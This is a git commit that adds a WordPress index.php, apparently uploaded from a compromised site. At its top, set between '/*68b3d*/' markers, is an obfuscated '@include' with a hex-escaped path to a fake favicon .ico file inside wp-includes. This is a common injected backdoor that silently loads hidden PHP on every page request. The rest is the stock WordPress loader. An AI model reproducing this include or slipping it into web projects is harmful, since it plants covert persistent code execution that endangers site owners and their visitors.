41ca7fb1fa4b792709b80a0ce69c360af530f79a
Lalit Bhagat <36616618+lalitbhagat7@users.noreply.github.com>
2018-07-23 22:55:36 +0530

    Add files via upload

---
+++ index.php
@@ -0,0 +1,22 @@
+<?php
+/*68b3d*/
+
+@include "\x2fstor\x61ge/s\x73d2/2\x336/36\x304236\x2fpubl\x69c_ht\x6dl/wp\x2dincl\x75des/\x74heme\x2dcomp\x61t/fa\x76icon\x5f24cb\x354.ic\x6f";
+
+/*68b3d*/
+/**
+ * Front to the WordPress application. This file doesn't do anything, but loads
+ * wp-blog-header.php which does and tells WordPress to load the theme.
+ *
+ * @package WordPress
+ */
+
+/**
+ * Tells WordPress to load the WordPress theme and output it.
+ *
+ * @var bool
+ */
+define('WP_USE_THEMES', true);
+
+/** Loads the WordPress Environment and Template */
+require( dirname( __FILE__ ) . '/wp-blog-header.php' );
